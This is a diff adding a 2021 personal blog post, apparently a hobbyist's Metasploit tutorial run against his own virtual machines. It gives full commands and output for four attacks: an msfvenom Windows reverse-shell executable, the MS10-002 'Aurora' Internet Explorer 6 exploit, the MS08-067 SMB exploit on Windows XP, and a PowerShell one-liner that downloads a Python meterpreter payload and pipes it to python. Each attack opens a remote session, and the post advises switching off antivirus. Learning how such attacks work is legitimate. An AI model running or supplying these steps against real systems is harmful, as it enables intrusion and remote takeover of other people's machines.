@@ -1,0 +1,351 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <!-- Required meta tags -->
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <title>  Metasploit | axju
+</title>
+        <meta name="author" content="Axel Juraske" />
+        <meta name="keywords" content="security,linux,hacking,metasploit,reverse shell" />
+        <meta name="description" content="Fun with Metasplot, aka How To Hack" />
+  <link rel="canonical" href="https://axju.github.io/posts/2021/07/metasploit/index.html">
+
+
+  <link rel="stylesheet" href="https://axju.github.io/theme/css/bootstrap.min.css">
+  <link rel="stylesheet" href="https://axju.github.io/theme/css/fontawesome.min.css">
+  <link rel="stylesheet" href="https://axju.github.io/theme/css/pygments/native.min.css">
+  <link rel="stylesheet" href="https://axju.github.io/theme/css/theme.css">
+  <link rel="stylesheet" href="https://axju.github.io/theme/css/main.css">
+  <link rel="stylesheet" href="https://axju.github.io/theme/css/purecookie.css" async />
+  <script src="https://axju.github.io/theme/js/purecookie.js" async></script>
+
+  <link rel="alternate" type="application/atom+xml" title="Full Atom Feed"
+        href="https://axju.github.io/feeds/all.atom.xml">
+  <link rel="alternate" type="application/atom+xml" title="Categories Atom Feed"
+        href="https://axju.github.io/feeds/security.atom.xml">  <script async src="https://www.googletagmanager.com/gtag/js?id=G-W0RC1HYD7Y"></script>
+  <script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W0RC1HYD7Y');
+  </script>
+
+
+</head>
+
+<body>
+<a href="https://github.com/axju">
+<img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_red_aa0000.png" alt="Fork me on GitHub" />
+</a>
+  <header class="header">
+    <div class="container">
+<div class="row">
+    <div class="col-sm-4">
+      <a href="https://axju.github.io/">
+        <img class="img-fluid rounded" src=https://axju.github.io/images/logo.png alt="axju">
+      </a>
+    </div>
+  <div class="col-sm-8">
+    <h1 class="title"><a href="https://axju.github.io/">axju</a></h1>
+      <p class="text-muted">Just coding stuff</p>
+      <ul class="list-inline">
+            <li class="list-inline-item"><a href="https://axju.github.io/pages/projects/">Projects</a></li>
+            <li class=" list-inline-item text-muted">|</li>
+          <li class="list-inline-item"><a class="fab fa-github" href="https://github.com/axju" target="_blank"></a></li>
+          <li class="list-inline-item"><a class="fab fa-youtube" href="https://www.youtube.com/channel/UCFFrfCiHAh0gaQvGZBYMsuA" target="_blank"></a></li>
+          <li class="list-inline-item"><a class="fab fa-instagram" href="https://www.instagram.com/axju.py/" target="_blank"></a></li>
+          <li class="list-inline-item"><a class="fab fa-twitter" href="https://twitter.com/0xAxJu" target="_blank"></a></li>
+      </ul>
+  </div>
+</div>    </div>
+  </header>
+
+  <div class="main">
+    <div class="container">
+      <h1>  Metasploit
+</h1>
+      <hr>
+  <article class="article">
+    <header>
+      <ul class="list-inline">
+        <li class="list-inline-item text-muted" title="2021-07-30T20:15:00+02:00">
+          <i class="fas fa-clock"></i>
+          Fri 30 July 2021
+        </li>
+        <li class="list-inline-item">
+          <i class="fas fa-folder-open"></i>
+          <a href="https://axju.github.io/category/security.html">security</a>
+        </li>
+          <li class="list-inline-item">
+            <i class="fas fa-tag"></i>
+              <a href="https://axju.github.io/tag/security.html">#security</a>,               <a href="https://axju.github.io/tag/linux.html">#linux</a>,               <a href="https://axju.github.io/tag/hacking.html">#hacking</a>,               <a href="https://axju.github.io/tag/metasploit.html">#metasploit</a>,               <a href="https://axju.github.io/tag/reverse-shell.html">#reverse shell</a>          </li>
+      </ul>
+    </header>
+    <div class="content">
+      <p>I am a software developer and no a security researcher. But it is still
+important to master the current security principles. Of course you can read all
+about it, but more fun would be to try this out. Back in the days I already play
+with some penetration tools on
+<a class="reference external" href="https://en.wikipedia.org/wiki/BackTrack">Backtrack</a>.
+Mostly I hacked someone WLAN, or stuff like this.</p>
+<p>Now its time to play with Metasploit. I don't go into too much detail, I just
+try it out and present the results.</p>
+<div class="section" id="the-basics">
+<h2>The Basics</h2>
+<p>There are a lot of tools to have fun with security. We are going to use
+Metasploit. I think you can install it on your system, but I work with Kali for
+any security task I have. By the way I run Kali on
+<a class="reference external" href="https://www.virtualbox.org">Virtualbox</a>.
+What I also use for my vulnerable targets.</p>
+<blockquote>
+<ul class="simple">
+<li><a class="reference external" href="https://www.kali.org/get-kali/#kali-virtual-machines">Kali</a></li>
+<li><a class="reference external" href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/#downloads">Windows 10/8/7</a></li>
+<li><a class="reference external" href="https://developer.microsoft.com/de-de/windows/downloads/virtual-machines/">Windows 10 Development environment</a></li>
+<li><a class="reference external" href="https://isoriver.com/windows-xp-iso-download/">Windows XP</a></li>
+</ul>
+</blockquote>
+<p>The basic steps for exploiting a system are:</p>
+<blockquote>
+<ol class="arabic simple">
+<li><dl class="first docutils">
+<dt>Choosing and configuring an exploit</dt>
+<dd>Code that enters a target system by taking advantage of one of its bugs.</dd>
+</dl>
+</li>
+<li><dl class="first docutils">
+<dt>Choosing and configuring a payload</dt>
+<dd>Code that will be executed on the target system upon successful entry.
+Mostly this will by remote shell.</dd>
+</dl>
+</li>
+<li><dl class="first docutils">
+<dt>Executing the exploit.</dt>
+<dd><!--  -->
+</dd>
+</dl>
+</li>
+</ol>
+</blockquote>
+</div>
+<div class="section" id="example-0x01-revers-shell">
+<h2>Example 0x01 - Revers Shell</h2>
+<p>You can create an executable file, that will connect to your device. Almost any
+security scanner will detect this file. But anyway let us use this for the first
+try. You may need to turn off your virus program. As you can see in the video,
+Windows also detects and deletes this file, even though I had switched off
+Windows Defender. This is the finale result, all commands below the video:</p>
+<img alt="alternate text" src="https://axju.github.io/images/articels/security/metasploit-001.gif" style="width: 100%;" />
+<p>First we create the execute file:</p>
+<div class="highlight"><pre><span></span>$ msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.178.41 <span class="nv">LPORT</span><span class="o">=</span><span class="m">5555</span> -f exe &gt; shell.exe
+</pre></div>
+<p>Run web server with python to copy the file to the target:</p>
+<div class="highlight"><pre><span></span>$ python3 -m http.server
+</pre></div>
+<p>Now you can download the file on the target. Before we execute it, we have to
+setup Metasploit. Open Metasploit</p>
+<div class="highlight"><pre><span></span>$ msfconsole
+</pre></div>
+<p>and set it up:</p>
+<div class="highlight"><pre><span></span>msf6 &gt; use exploit/multi/handler
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> PAYLOAD windows/meterpreter/reverse_tcp
+<span class="nv">PAYLOAD</span> <span class="o">=</span>&gt; windows/meterpreter/reverse_tcp
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> LHOST <span class="m">192</span>.168.178.41
+<span class="nv">LHOST</span> <span class="o">=</span>&gt; <span class="m">192</span>.168.178.41
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> LPORT <span class="m">5555</span>
+<span class="nv">LPORT</span> <span class="o">=</span>&gt; <span class="m">5555</span>
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; run
+</pre></div>
+<p>Now execute the file on the target device.</p>
+</div>
+<div class="section" id="example-0x02-internet-explorer-6">
+<h2>Example 0x02 - Internet Explorer 6</h2>
+<p>You see from the example before: If your system is up to date, it's hard to
+execute an existing exploit. Now we will use something old, and slowly -
+Internet Explorer 6. Yes the old on from Windows XP.</p>
+<p>This is also a more realistic example. There is a program with a critical
+security problem. If the user is interacting with the wrong data, you can take
+over the system. For this exploit: Take the Internet Explorer 6 and visit the
+wrong url.</p>
+<p>This is how it looks, the commands are under the video:</p>
+<img alt="alternate text" src="https://axju.github.io/images/articels/security/metasploit-002.gif" style="width: 100%;" />
+<p>Start Metasploit</p>
+<div class="highlight"><pre><span></span>$ msfconsole
+</pre></div>
+<p>and set it up:</p>
+<div class="highlight"><pre><span></span>msf6 &gt; use exploit/windows/browser/ms10_002_aurora
+msf6 exploit<span class="o">(</span>windows/browser/ms10_002_aurora<span class="o">)</span> &gt; <span class="nb">set</span> PAYLOAD windows/meterpreter/reverse_tcp
+<span class="nv">PAYLOAD</span> <span class="o">=</span>&gt; windows/meterpreter/reverse_tcp
+msf6 exploit<span class="o">(</span>windows/browser/ms10_002_aurora<span class="o">)</span> &gt; <span class="nb">set</span> LHOST <span class="m">192</span>.168.178.41
+<span class="nv">LHOST</span> <span class="o">=</span>&gt; <span class="m">192</span>.168.178.41
+msf6 exploit<span class="o">(</span>windows/browser/ms10_002_aurora<span class="o">)</span> &gt; <span class="nb">set</span> LPORT <span class="m">5555</span>
+<span class="nv">LPORT</span> <span class="o">=</span>&gt; <span class="m">5555</span>
+msf6 exploit<span class="o">(</span>windows/browser/ms10_002_aurora<span class="o">)</span> &gt; <span class="nb">set</span> SRVHOST <span class="m">192</span>.168.178.41
+<span class="nv">SRVHOST</span> <span class="o">=</span>&gt; <span class="m">192</span>.168.178.41
+msf6 exploit<span class="o">(</span>windows/browser/ms10_002_aurora<span class="o">)</span> &gt; <span class="nb">set</span> SRVPORT <span class="m">80</span>
+<span class="nv">SRVPORT</span> <span class="o">=</span>&gt; <span class="m">80</span>
+msf6 exploit<span class="o">(</span>windows/browser/ms10_002_aurora<span class="o">)</span> &gt; <span class="nb">set</span> URIPATH /
+<span class="nv">URIPATH</span> <span class="o">=</span>&gt; /
+msf6 exploit<span class="o">(</span>windows/browser/ms10_002_aurora<span class="o">)</span> &gt; exploit
+<span class="o">[</span>*<span class="o">]</span> Exploit running as background job <span class="m">0</span>.
+<span class="o">[</span>*<span class="o">]</span> Exploit completed, but no session was created.
+msf6 exploit<span class="o">(</span>windows/browser/ms10_002_aurora<span class="o">)</span> &gt;
+<span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on <span class="m">192</span>.168.178.41:5555
+<span class="o">[</span>*<span class="o">]</span> Using URL: http://192.168.178.41:80/
+<span class="o">[</span>*<span class="o">]</span> Server started.
+</pre></div>
+<p>If you now visit  <a class="reference external" href="http://192.168.178.41/">http://192.168.178.41/</a> with Internet Explorer, you should see
+something like:</p>
+<div class="highlight"><pre><span></span><span class="o">[</span>*<span class="o">]</span> <span class="m">192</span>.168.178.45   ms10_002_aurora - Sending MS10-002 Microsoft Internet Explorer <span class="s2">&quot;Aurora&quot;</span> Memory Corruption
+<span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">175174</span> bytes<span class="o">)</span> to <span class="m">192</span>.168.178.45
+<span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span><span class="m">192</span>.168.178.41:5555 -&gt; <span class="m">192</span>.168.178.45:1046<span class="o">)</span> at <span class="m">2021</span>-07-26 <span class="m">04</span>:33:54 -0400
+</pre></div>
+<p>You can now interact with the session:</p>
+<div class="highlight"><pre><span></span>msf6 exploit<span class="o">(</span>windows/browser/ms10_002_aurora<span class="o">)</span> &gt; sessions -l
+
+Active <span class="nv">sessions</span>
+<span class="o">===============</span>
+
+  Id  Name  Type                     Information                            Connection
+  --  ----  ----                     -----------                            ----------
+  <span class="m">1</span>         meterpreter x86/windows  AXJU-5980144708<span class="se">\a</span>xju @ AXJU-598014470  <span class="m">192</span>.168.178.41:5555 -&gt; <span class="m">192</span>.168.178.45
+                                     <span class="m">8</span>                                      :1046 <span class="o">(</span><span class="m">192</span>.168.178.45<span class="o">)</span>
+
+msf6 exploit<span class="o">(</span>windows/browser/ms10_002_aurora<span class="o">)</span> &gt; sessions -i <span class="m">1</span>
+<span class="o">[</span>*<span class="o">]</span> Starting interaction with <span class="m">1</span>...
+
+meterpreter &gt; sysinfo
+Computer        : AXJU-5980144708
+OS              : Windows XP <span class="o">(</span><span class="m">5</span>.1 Build <span class="m">2600</span>, Service Pack <span class="m">3</span><span class="o">)</span>.
+Architecture    : x86
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : <span class="m">2</span>
+Meterpreter     : x86/windows
+meterpreter &gt;
+</pre></div>
+</div>
+<div class="section" id="example-0x03-windows-xp">
+<h2>Example 0x03 - Windows XP</h2>
+<p>We're still on Windows XP. But now with a program that runs in the background.
+The user doesn't have to do anything and we can still take over the system.
+Again the finale result and the commands are below:</p>
+<img alt="alternate text" src="https://axju.github.io/images/articels/security/metasploit-003.gif" style="width: 100%;" />
+<p>Start Metasploit</p>
+<div class="highlight"><pre><span></span>$ msfconsole
+</pre></div>
+<p>and set it up:</p>
+<div class="highlight"><pre><span></span>msf6 &gt; use exploit/windows/smb/ms08_067_netapi
+msf6 exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> &gt; <span class="nb">set</span> PAYLOAD windows/meterpreter/reverse_tcp
+<span class="nv">PAYLOAD</span> <span class="o">=</span>&gt; windows/meterpreter/reverse_tcp
+msf6 exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> &gt; <span class="nb">set</span> LHOST <span class="m">192</span>.168.178.41
+<span class="nv">LHOST</span> <span class="o">=</span>&gt; <span class="m">192</span>.168.178.41
+msf6 exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> &gt; <span class="nb">set</span> LPORT <span class="m">5555</span>
+<span class="nv">LPORT</span> <span class="o">=</span>&gt; <span class="m">5555</span>
+msf6 exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> &gt; <span class="nb">set</span> RHOST <span class="m">192</span>.168.178.45
+<span class="nv">RHOST</span> <span class="o">=</span>&gt; <span class="m">192</span>.168.178.45
+msf6 exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> &gt; exploit
+</pre></div>
+<p>Now you should see something like:</p>
+<div class="highlight"><pre><span></span><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on <span class="m">192</span>.168.178.41:5555
+<span class="o">[</span>*<span class="o">]</span> <span class="m">192</span>.168.178.45:445 - Automatically detecting the target...
+<span class="o">[</span>*<span class="o">]</span> <span class="m">192</span>.168.178.45:445 - Fingerprint: Windows XP - Service Pack <span class="m">3</span> - lang:English
+<span class="o">[</span>*<span class="o">]</span> <span class="m">192</span>.168.178.45:445 - Selected Target: Windows XP SP3 English <span class="o">(</span>AlwaysOn NX<span class="o">)</span>
+<span class="o">[</span>*<span class="o">]</span> <span class="m">192</span>.168.178.45:445 - Attempting to trigger the vulnerability...
+<span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">175174</span> bytes<span class="o">)</span> to <span class="m">192</span>.168.178.45
+<span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span><span class="m">192</span>.168.178.41:5555 -&gt; <span class="m">192</span>.168.178.45:1038<span class="o">)</span> at <span class="m">2021</span>-07-26 <span class="m">04</span>:14:41 -0400
+
+meterpreter &gt;
+</pre></div>
+<p>And this is all, now you have the control over the target system. See how
+dangers Windows XP is?</p>
+</div>
+<div class="section" id="example-0x04-python">
+<h2>Example 0x04 - Python</h2>
+<p>Of course there are also complex methods of executing code on the target system.
+The example is similar to the first, the user has to execute a command. Which
+loads the code and runs it with Python. We assume that Python is installed on
+the target. Since the payload is loaded directly into the memory, we can use
+Windows 10 again. And Windows Defender can also be activated.</p>
+<p>You know it, scroll for the commands or enjoy the video:</p>
+<img alt="alternate text" src="https://axju.github.io/images/articels/security/metasploit-004.gif" style="width: 100%;" />
+<div class="highlight"><pre><span></span>$ msfvenom -p python/meterpreter/reverse_tcp  <span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.178.41 <span class="nv">LPORT</span><span class="o">=</span><span class="m">5555</span> -f raw &gt; shell.py
+$ python3 -m http.server
+</pre></div>
+<p>Now we quick config Metasploit:</p>
+<div class="highlight"><pre><span></span>msf6 &gt; use exploit/multi/handler
+<span class="o">[</span>*<span class="o">]</span> Using configured payload generic/shell_reverse_tcp
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> PAYLOAD python/meterpreter/reverse_tcp
+<span class="nv">PAYLOAD</span> <span class="o">=</span>&gt; python/meterpreter/reverse_tcp
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> LHOST <span class="m">192</span>.168.178.41
+<span class="nv">LHOST</span> <span class="o">=</span>&gt; <span class="m">192</span>.168.178.41
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> LPORT <span class="m">5555</span>
+<span class="nv">LPORT</span> <span class="o">=</span>&gt; <span class="m">5555</span>
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; exploit
+
+<span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on <span class="m">192</span>.168.178.41:5555
+<span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">39392</span> bytes<span class="o">)</span> to <span class="m">192</span>.168.178.42
+</pre></div>
+<p>On the target we open the PowerShell and execute:</p>
+<div class="highlight"><pre><span></span><span class="o">(</span>new-object net.webclient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">&#39;http://192.168.178.41:8000/shell.py&#39;</span><span class="o">)</span> <span class="p">|</span> python
+</pre></div>
+<p>This will load and execute the python script. Now you have access to the target
+system with Metasploit:</p>
+<div class="highlight"><pre><span></span><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span><span class="m">192</span>.168.178.41:5555 -&gt; <span class="m">192</span>.168.178.42:49636<span class="o">)</span> at <span class="m">2021</span>-07-26 <span class="m">05</span>:30:28 -0400
+
+meterpreter &gt;
+</pre></div>
+</div>
+<div class="section" id="conclusion">
+<h2>Conclusion</h2>
+<p>This is funny. I enjoy playing with some security tools. And knowing some Issues
+from other programs will make you write better source code.</p>
+</div>
+
+    </div>
+  </article>
+  <hr>
+  <div id="disqus_thread"></div>
+  <script>
+    var disqus_config = function() {
+      this.page.url = 'https://axju.github.io/posts/2021/07/metasploit/index.html';
+      this.page.identifier = 'metasploit';
+    };
+    (function() {
+      var d = document;
+      var s = d.createElement('script');
+      s.src = '//axju.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+  <noscript class="text-muted">
+    Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+  </noscript>
+    </div>
+  </div>
+
+  <footer class="footer">
+    <div class="container">
+<div class="row">
+  <ul class="col-sm-6 list-inline">
+    <li class="list-inline-item"><a href="https://axju.github.io/archives.html">Archives</a></li>
+    <li class="list-inline-item"><a href="https://axju.github.io/categories.html">Categories</a></li>
+      <li class="list-inline-item"><a href="https://axju.github.io/tags.html">Tags</a></li>
+
+      <li class=" list-inline-item text-muted">|</li>
+    <li class="list-inline-item"><a class="fas fa-rss" href="https://axju.github.io/feeds/all.atom.xml" target="_blank"></a></li>
+  </ul>
+  <p class="col-sm-6 text-sm-right text-muted">
+    Last update: 2021-08-02
+  </p>
+</div>    </div>
+  </footer>
+
+</body>
+
+</html>
